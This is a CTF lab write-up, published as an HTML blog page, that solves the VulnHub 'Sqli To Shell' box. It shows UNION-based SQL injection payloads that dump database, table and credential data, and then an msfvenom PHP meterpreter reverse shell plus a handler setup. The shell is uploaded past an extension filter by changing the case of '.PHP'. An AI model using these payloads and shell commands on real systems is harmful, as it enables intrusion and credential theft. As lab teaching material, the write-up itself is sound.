@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Sqli_to_shell :: LoneWolf4713&#39;s CTF Writeups</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Hello Hackers , Today we will be solving Sqli To Shell. The Box Seems Easy , But Never Underestimate your opponents !
+Goal - Find An Sql Injection Vuln and Then exploit it to get a Shell .
+Step 1: Reconnaissance ! Let&amp;rsquo;s browse the website for time with our browser We Find Two Points Of Interest
+  An Admin Login Page   Parameter &amp;ldquo;ID&amp;rdquo; is Passed To cat." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://lonewolf4713.github.io/ctfs/posts/sqli-to-shell-walkthrough/" />
+
+
+
+
+<link rel="stylesheet" href="https://lonewolf4713.github.io/ctfs/assets/style.css">
+
+  <link rel="stylesheet" href="https://lonewolf4713.github.io/ctfs/assets/red.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://lonewolf4713.github.io/ctfs/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://lonewolf4713.github.io/ctfs/img/favicon/red.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="https://github.com/LoneWolf4713" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Sqli_to_shell">
+<meta property="og:description" content="Hello Hackers , Today we will be solving Sqli To Shell. The Box Seems Easy , But Never Underestimate your opponents !
+Goal - Find An Sql Injection Vuln and Then exploit it to get a Shell .
+Step 1: Reconnaissance ! Let&amp;rsquo;s browse the website for time with our browser We Find Two Points Of Interest
+  An Admin Login Page   Parameter &amp;ldquo;ID&amp;rdquo; is Passed To cat." />
+<meta property="og:url" content="https://lonewolf4713.github.io/ctfs/posts/sqli-to-shell-walkthrough/" />
+<meta property="og:site_name" content="LoneWolf4713&#39;s CTF Writeups" />
+
+  
+    <meta property="og:image" content="https://lonewolf4713.github.io/ctfs/img/favicon/red.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2021-07-02 09:52:27 &#43;0530 IST" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="red">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    LoneWolf4713&#39;s CTF Writeups
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/ctfs/about">About</a></li>
+        
+      
+        
+          <li><a href="/ctfs/showcase">Showcase</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/ctfs/about">About</a></li>
+      
+    
+      
+        <li><a href="/ctfs/showcase">Showcase</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://lonewolf4713.github.io/ctfs/posts/sqli-to-shell-walkthrough/">Sqli_to_shell</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2021-07-02 
+      </span>
+    
+    
+  </div>
+
+  
+
+  
+
+  
+
+  <div class="post-content"><div>
+        <p>Hello Hackers , Today we will be solving <a href="www.vulnhub.com">Sqli To Shell</a>.
+The Box Seems Easy , But Never Underestimate your opponents !</p>
+<p>Goal - Find An Sql Injection Vuln and Then exploit it to get a Shell .</p>
+<h1 id="step-1-reconnaissance-">Step 1: Reconnaissance !<a href="#step-1-reconnaissance-" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Let&rsquo;s browse the website for time with our browser
+<img src="/images/1.png" alt="admin-login"></p>
+<p>We Find Two Points Of Interest</p>
+<ol>
+<li>
+<p>An Admin Login Page
+<img src="/images/3.png" alt="admin-login"></p>
+</li>
+<li>
+<p>Parameter &ldquo;ID&rdquo; is Passed To <!-- raw HTML omitted -->cat.php<!-- raw HTML omitted --> Using GET Method !
+<img src="/images/2.png" alt="parameters"></p>
+</li>
+</ol>
+<h1 id="step-2-probing-">Step 2: Probing !<a href="#step-2-probing-" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Let&rsquo;s Try To Probe The <!-- raw HTML omitted -->cat.php<!-- raw HTML omitted --> To Find any vulns.
+We Will Try By replacing &ldquo;ID&rdquo; param. with a single quote ( ' )  in URL</p>
+<p><img src="/images/4.png" alt="single-quote"></p>
+<h4 id="yes--the-application-crashed-and-returned-an-mysql-error">Yes ! The Application Crashed and returned an MySQL error<a href="#yes--the-application-crashed-and-returned-an-mysql-error" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>Which means , our Input Dictates the behaviour Of App.
+Therefore , It Is Vulnerable To <!-- raw HTML omitted --> SQL INJECTION ! <!-- raw HTML omitted --></p>
+<h1 id="step-3-exploitation-">Step 3: Exploitation !<a href="#step-3-exploitation-" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Let Us Try , <!-- raw HTML omitted -->id=1'<!-- raw HTML omitted --> In URL parameter.
+<code>..id=1'</code>
+<img src="/images/6.png" alt="single-quote-in-url">
+It shows an error .</p>
+<p>lets us try putting directly an OR statement <code>..id=1 or 1=1--</code>
+<img src="/images/y7.png" alt="or-statement"></p>
+<h4 id="it-worked--the-webpage-returns-all-items">IT WORKED ! The Webpage returns all items.<a href="#it-worked--the-webpage-returns-all-items" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p><code>..id=1 OR 1=1-- Explanation -</code>
+Here , OR Statement tells app that it will have to either have to return items  with id matching 1 or 1=1 ,
+Since 1=1 is always true , the app returns all items . Yeah , that took a while to understand.</p>
+<h1 id="step-4-post-exploitation---taking-down-goals--">Step 4: Post Exploitation ! ( Taking Down Goals ! )<a href="#step-4-post-exploitation---taking-down-goals--" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h3 id="finding-column-and-number-of-columns">Finding Column and Number Of Columns<a href="#finding-column-and-number-of-columns" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Now , we&rsquo;re going to extract information from a database , and for that we&rsquo;re going to use
+<strong>UNION CLAUSE</strong> In SQL.
+UNION clause helps in binding two sql queries together. on condition that they have same number of columns.
+It&rsquo;s like it will append the two queries' results  together in same amount of columns.
+If two queries have different columns , It will throw a error right at your you.</p>
+<p>So To Guess how many columns our default query running on server has , we will use
+<strong>NULL COLUMN DATATYPE</strong> ,A column datatype that can take any other columns datatype , or atleast be
+compatible with them. and results in no data what so ever.</p>
+<p>Since , We See That two things are displayed when we enter 1 or any other number in ID PARAMETER.
+that is the - Title and PHOTO. Hence , lets try two null columns to match the no of columns with the query.</p>
+<p><strong>Enter In URL -</strong>
+<code>http://192.168.118.133/cat.php?id=1 UNION SELECT null,null </code>
+<img src="/images/8.png" alt="NOT same number of columns">
+Oops , it throws an error saying two queries have different number of columns.
+Lets try again with 3 columns and again with 4 null columns , each seperated by a &ldquo;,&rdquo; comma.</p>
+<p>3 null columns doesn&rsquo;t work , but at 4 null columns, We get a clear Success !
+<img src="/images/9.png" alt="4-null-columns"></p>
+<p>here, we see that in addition to a &ldquo;photo-title pair&rdquo; , we get a null title and picture.
+so let&rsquo;s see which columns in the query are being put in &ldquo;photo-title-pair&rdquo;.</p>
+<p><strong>Put 123 in place of 1st NULL Column</strong>.<br>
+<strong>Put&rsquo;abc' in place of 2nd NULL Column</strong>.<br>
+<strong>Put &lsquo;pqrs&rsquo; in place of 3rd NULL Column</strong>.<br>
+<strong>Put &lsquo;xyz&rsquo; in place of 4th NULL Column.</strong><br>
+<code>...id=1 UNION 123,'abc','pqrs','xyz'</code></p>
+<p><img src="/images/10.png" alt="column-found">
+Hence , the Second Column Is being displayed in the page.</p>
+<h3 id="getting-information-to-target">Getting Information To Target.<a href="#getting-information-to-target" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Now , We need 3 parameters to get our username/passwd. they are -</p>
+<ol>
+<li><strong>Database Name</strong></li>
+<li><strong>Table Name</strong></li>
+<li><strong>Column Name</strong></li>
+</ol>
+<h4 id="1-getting-database-name--">1. Getting Database Name -<a href="#1-getting-database-name--" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>In Our URL , replace &lsquo;abc&rsquo; with database()
+` &hellip; id=1 UNION 123,database(),&lsquo;pqrs&rsquo;,&lsquo;xyz&rsquo;</p>
+<p><img src="/images/11.png" alt="database-name-returned">
+Now We Have The Database Name , as MySQL database() function returns database name .</p>
+<h4 id="2--getting-table-name--">2.  Getting Table Name -<a href="#2--getting-table-name--" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>Every Database Has A &lsquo;Metadata Table&rsquo; , which keeps record of all the tables/columns
+in a database.In MySQL , it is &lsquo;Information_Schema&rsquo; and has many tables,including
+one named <strong>tables</strong> and one named <strong>columns</strong>.
+Looks Like A Perfect Spot to get our Table Name And Column Name !</p>
+<p><strong>Enter In URL -</strong> <br>
+<code>.. id=1 UNION SELECT 123,table_name,'pqrs','xyz' from information_schema.tables</code></p>
+<p>Here,we have used SQL DOT NOTATION , to query another database table .
+Its like , &ldquo;DATABASE_NAME.TABLE_NAME&rdquo;.</p>
+<p><img src="/images/12.png" alt="got-all-tablename">
+As You can see, that the page returns all tablename, including a <strong>USERS</strong> tablename at the very bottom !</p>
+<p>Hence , We Will Target The <strong>USERS</strong> table in <strong>PHOTOBLOG</strong> Database.</p>
+<h4 id="3-getting-column-names-">3. Getting Column Names-<a href="#3-getting-column-names-" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p><strong>In URL , Make Changes !</strong> <br>
+<code>...id=1 UNION SELECT 123,column_name,'pqrs','xyz' FROM information_schema.columns WHERE table_name='users' </code><br>
+Now ,We say - Give me <strong>column_name</strong> from <strong>colummns</strong> table in <strong>information_schema</strong> database where <strong>table_name</strong> is <strong>users</strong> .<br>
+Hence , It Will Return Column Names only from Table Users.
+<img src="/images/13.png" alt="got-column-names">
+As You Can See , We Got The Columns !</p>
+<h4 id="extracting-credenials-">Extracting Credenials !<a href="#extracting-credenials-" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p><strong>Enter In URL -</strong> <br>
+<code>..id=1 UNION 123,concat(login,&quot;@&quot;,password),null,null FROM photoblog.users </code> <br>
+Here ,</p>
+<ol>
+<li><strong>Concat()</strong> is a MySQL function used to join many strings together , And we are using it to join our &lsquo;login and password&rsquo; column together.Since we have only one column from result being displayed.</li>
+<li><strong>Login and Password</strong> are our two columns.</li>
+<li><strong>Photoblog.Users</strong> is our Database and Table_Name in DOT Notation.</li>
+</ol>
+<p><img src="/images/14.png" alt="password-found">
+We atlast got the Creds. Great Work !</p>
+<h5 id="but-the-passwd-is-encrypted-using-md5-algorithm-hence-we-need-to-decrypt-it">But The Passwd is Encrypted (Using MD5 Algorithm ),Hence we need to Decrypt it.<a href="#but-the-passwd-is-encrypted-using-md5-algorithm-hence-we-need-to-decrypt-it" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h5>
+<p>Head over to <a href="https://hashes.com/en/tools/hash_identifier">This Site</a> To Decrypt Hash.
+and Then try to login.<br>
+<img src="/images/15.png" alt="logged-in">
+<code>And There We Go ! We Got Logged In !</code></p>
+<h4 id="getting-the-shell-">Getting The Shell !<a href="#getting-the-shell-" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>Now , All we have to do is get our Shell.
+Since the Main Extension of these webpages is <strong>.php</strong> ,We will make a PHP reverse shell meterpreter payload.</p>
+<p><strong>Let&rsquo;s Generate PHP Reverse Shell using MSFVENOM</strong> <br>
+<code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.118.128 LPORT=4747 -f raw -o not-a-virus.php </code></p>
+<p><em>Explanation-</em></p>
+<ol>
+<li><strong>&quot;-p&quot; parameter stands for payload type.</strong></li>
+<li><strong>&ldquo;LHOST&rdquo; your machine IP ,(Our IP)</strong></li>
+<li><strong>&ldquo;LPORT&rdquo; &ldquo;Local Port&rdquo; will be the port on our side which will stay open to catch connections.</strong></li>
+<li><strong>&quot;-f&quot; format=raw , since we want raw php code to execute on the web-server.</strong></li>
+<li><strong>&quot;-o&quot; output file name.</strong></li>
+</ol>
+<h6 id="start-msfconsole-and-set-options--">Start msfconsole and set options -<a href="#start-msfconsole-and-set-options--" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h6>
+<p><code>msfconsole</code>  <br>
+<code>use multi/handler</code><br>
+<code>set payload php/meterpreter/reverse_tcp</code>  <br>
+<code>set LHOST 192.168.118.128</code>             <br>
+<code>set LPORT 4747</code>          <br>
+<code>run</code></p>
+<p>Since The Purpose of a &ldquo;Reverse-Shell&rdquo; is to connect back to attacker. This will handle the connection our payload will make to us.</p>
+<p><img src="/images/16.png" alt="msfconsole-setup"></p>
+<p>Now,We Have To Upload Our Shell To Server to execute it. Let&rsquo;s Try The <strong>&ldquo;New Picture&rdquo;</strong> Link besides Logout Option in Admin Panel.</p>
+<p><img src="/images/17.png" alt="upload-shell-fake">      <br>
+Oh, Admin has disabled &ldquo;.php&rdquo; files and we get an error -
+<img src="/images/18.png" alt="upload-shell-error"></p>
+<p>To Bypass This Limitation,Let&rsquo;s try renaming our file as <strong>&ldquo;not-a-virus.PHP&rdquo;</strong> and uploading it.
+<img src="/images/19.png" alt="upload-shell-success">   <br>
+We Successfully bypassed the File Extension Limit.The admin didn&rsquo;t even bother to effectively enforce the Limit !</p>
+<h2 id="last-step--click-on-the-link-definitely-not-a-virus-to-run-our-code">Last Step , Click on the link &ldquo;definitely-not-a-virus&rdquo; to run our code.<a href="#last-step--click-on-the-link-definitely-not-a-virus-to-run-our-code" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p><img src="/images/20.png" alt="clicked">
+<img src="/images/21.png" alt="shell">
+AND So we got the Meterpreter Shell. Another day , another shell !</p>
+<h1 id="box-owned-">Box Owned !<a href="#box-owned-" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p><code>You might be thinking why requesting a php file in my browser makes it run on the web-server?</code>   <br>
+<code>This is because PHP stands for &quot;Hyper-Text PreProcesser&quot;,It's job is to pre-process the HTML,(In order to dynamically generate HTML) before sending it to browser. Hence,before sending the HTML page to us,the page is &quot;processed&quot; and our malicious code gets executed to the server !</code></p>
+<p>Thank You !</p>
+
+      </div></div>
+
+  
+  
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>LoneWolf4713</span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://lonewolf4713.github.io/ctfs/assets/main.js"></script>
+<script src="https://lonewolf4713.github.io/ctfs/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
